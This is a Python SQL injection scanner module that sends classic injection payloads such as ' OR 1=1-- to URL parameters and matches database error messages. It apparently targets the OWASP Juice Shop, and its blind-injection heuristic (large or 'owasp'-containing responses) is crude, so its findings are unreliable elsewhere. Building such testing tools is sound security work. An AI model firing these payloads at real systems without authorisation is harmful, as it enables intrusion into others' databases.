import httpx
import re
from urllib.parse import urlparse, parse_qs, urlunparse

# Classic payloads for error-based SQL injection testing
# Includes the advanced Juice Shop bypass payload
SQL_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "\\'",
    "')) OR 1=1--"
]

# Regex patterns used to detect database error messages
ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"syntax error.*postgresql",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"ora-\d{5}",  # Oracle errors
    r"sqlite_error",
    r"pg::syntaxerror",
]


async def _test_parameter(
    client: httpx.AsyncClient,
    base_url: str,
    params: dict,
    param_name: str
) -> str | None:
    """
    Tests a single parameter with all payloads.
    Returns vulnerability details if detected.
    """

    for payload in SQL_PAYLOADS:
        test_params = params.copy()
        test_params[param_name] = payload

        try:
            response = await client.get(
                base_url,
                params=test_params,
                timeout=5.0
            )

            body_lower = response.text.lower()

            # Stage 1: Regex-based SQL error detection
            for pattern in ERROR_PATTERNS:
                if re.search(pattern, body_lower):
                    return (
                        f"Database syntax error detected via "
                        f"parameter '{param_name}' "
                        f"(Payload: `{payload}`)"
                    )

            # Stage 2: Blind SQLi / abnormal data exposure detection
            # Even if errors are hidden, OR 1=1 may expose large responses
            if "owasp" in body_lower or len(response.text) > 5000:
                return (
                    f"Blind SQLi triggered on parameter "
                    f"'{param_name}'! "
                    f"Abnormal data exposure detected with "
                    f"payload '{payload}'."
                )

        except Exception:
            continue

    return None


async def scan(url: str, client: httpx.AsyncClient):
    try:
        # Dynamically extract existing URL parameters
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)

        params_to_test = {
            k: v[0]
            for k, v in existing_params.items()
        }

        # Default fuzzing targets if no parameters exist
        if not params_to_test:
            params_to_test = {
                "id": "1",
                "search": "test",
                "q": "test",
                "page": "1"
            }

        base_url = urlunparse(parsed._replace(query=""))

        found_details = []

        for param_name in params_to_test:
            detail = await _test_parameter(
                client,
                base_url,
                params_to_test,
                param_name
            )

            if detail:
                found_details.append(detail)

        if found_details:
            return {
                "scanner": "SQL Injection",
                "status": "Vulnerability Found",
                "severity": "Critical",
                "detail": " | ".join(found_details)
            }

        return {
            "scanner": "SQL Injection",
            "status": "Secure",
            "severity": "Info",
            "detail": (
                f"Tested parameters: "
                f"{list(params_to_test.keys())}. "
                f"No SQL injection vulnerability detected."
            )
        }

    except Exception as e:
        # Detailed error handling
        error_msg = (
            f"{type(e).__name__}: {str(e)}"
            if str(e)
            else type(e).__name__
        )

        return {
            "scanner": "SQL Injection",
            "status": "Error",
            "severity": "Info",
            "detail": error_msg
        }